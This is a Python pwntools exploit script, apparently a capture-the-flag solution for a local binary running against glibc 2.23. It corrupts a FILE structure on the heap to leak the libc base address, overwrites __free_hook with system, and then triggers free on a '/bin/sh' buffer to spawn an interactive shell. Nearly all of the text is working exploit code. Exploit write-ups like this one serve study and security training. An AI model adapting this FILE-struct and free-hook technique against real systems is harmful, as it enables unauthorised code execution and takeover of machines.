#!/usr/bin/python3

from pwn import *

r = process('./T', env={"LD_PRELOAD": "./libc-2.23.so"})
context.arch = 'amd64'

def openfile(filename):
	r.recvuntil("choice :")
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(filename)

def readfile(idx, size):
	r.recvuntil("choice :")
	r.sendline("2")
	r.recvuntil("Index:")
	r.sendline(str(idx))
	r.recvuntil("Size:")
	r.sendline(str(size))

def writefile():
	r.recvuntil("choice :")
	r.sendline("3")

def alloc(size):
	r.recvuntil("choice :")
	r.sendline("4")
	r.recvuntil("Size:")
	r.sendline(str(size))


fd_magic = 0xfbad0000
currently = 0x800
##### arbitrarily read => leak libc
openfile('/dev/stdin') # stdin fd in heap
alloc(0x20)
writefile() # /dev/null fp in heap
readfile(0, 0x68+0x40)

base = 0x601fa8
end = base + 0x10
flag = fd_magic | currently
payload = b"a"*0x30 + flat(flag, 0, base, 0, base, end, end) + b'\x00'*0x38 + p64(1)

# if we use stdin read lots of datas, these will overwrite /dev/null FILE struct
# so we can control the file struct, and arbitrarily read / write
sleep(0.1)
r.send(payload)
writefile()
libc = u64(r.recv(6) + b'\x00'*2) - 0x347a0
log.info(f"libc: {hex(libc)}")

##### arbitrarily write => write free_hook
flag = fd_magic # read condition
_free_hook = 0x3c57a8 + libc
log.info(f"free_hook: {hex(_free_hook)}")
payload2 = b"a"*0x30 + flat(flag, -0x78, 0, 0, 0, 0, 0, _free_hook-8, _free_hook+9) # buf_base and buf_end
# why _free_hook - 8? because if it is _free_hook, it just like call system(system)

alloc(0x20) # offset = 0x24b0
openfile('/dev/stdin') # stdin fp in heap
readfile(1, 0x78)
sleep(0.1)
r.send(payload2)
input()
readfile(1, 0x10)
_system = 0x45390 + libc
sleep(0.1)
r.send(b'/bin/sh\x00' + p64(_system)) # will write into free_hook
# now content will be '/bin/sh\x00' + p64(system)
input()
r.recvuntil(':')
r.sendline('5')
r.interactive()
